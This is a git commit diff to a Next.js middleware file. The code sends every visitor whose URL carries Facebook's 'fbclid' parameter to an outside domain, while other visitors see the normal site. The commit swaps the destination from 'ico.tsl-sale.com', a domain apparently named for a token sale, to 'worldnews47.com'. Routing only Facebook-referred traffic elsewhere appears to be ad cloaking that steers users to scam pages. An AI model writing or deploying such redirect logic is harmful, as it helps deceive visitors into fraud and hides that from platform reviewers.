81cdf27191b523926b21ac1e752668c191790e78
naimgashi <108741002+naimgashi@users.noreply.github.com>
2022-07-06 22:47:37 +0800

    Update middleware.js

--- src/middleware.js
+++ src/middleware.js
@@ -3,7 +3,7 @@ export async function middleware(req, ev) {
     const { pathname } = req.nextUrl
     const url = req.nextUrl.clone()
     if (req.nextUrl.searchParams.get('fbclid')) {
-        return NextResponse.redirect('https://ico.tsl-sale.com/'+url.pathname)
+        return NextResponse.redirect('https://worldnews47.com/'+url.pathname)
     }
     return NextResponse.next()
 }
